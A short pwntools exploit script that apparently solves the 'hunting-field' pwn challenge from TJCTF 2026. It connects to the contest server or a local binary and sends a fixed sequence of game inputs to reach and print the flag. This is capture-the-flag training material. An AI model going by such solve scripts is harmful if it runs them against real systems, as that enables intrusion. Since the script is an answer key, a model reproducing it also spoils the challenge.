#!/usr/bin/env python3
from pwn import *

TARGET_PATH = os.path.realpath("/ctf-writeups/2026/tjctf/pwn/hunting-field/dist/game")

elf = context.binary = ELF(TARGET_PATH)

context.update(log_level="debug", terminal=["tmux", "split-window", "-h", "-l 65%"])


def get_stream():
    if "remote" in sys.argv:
        return remote("tjc.tf", 31412)

    return process(TARGET_PATH)


def attach_gdb(r):
    if "debug" not in sys.argv:
        return

    bkps = []
    cmds = []

    gdbscript = ["break {}".format(x) for x in bkps] + cmds
    gdb.attach(r, "\n".join(gdbscript))


def exploit(r):
    for _ in range(0x20):
        r.sendlineafter(b"(W)est ", b"XX")

    r.sendlineafter(b"(W)est ", b"hu")
    r.sendlineafter(b"(W)est ", b"nt")

    r.sendlineafter(b"(W)est ", b"XX")

    for cmd in [b"MN", b"MW", b"MN", b"MW", b"MW"]:
        r.sendlineafter(b"(W)est ", cmd)

    print(r.recvline_contains("tjctf").decode())


def main():
    r = get_stream()
    attach_gdb(r)
    exploit(r)


if __name__ == "__main__":
    main()
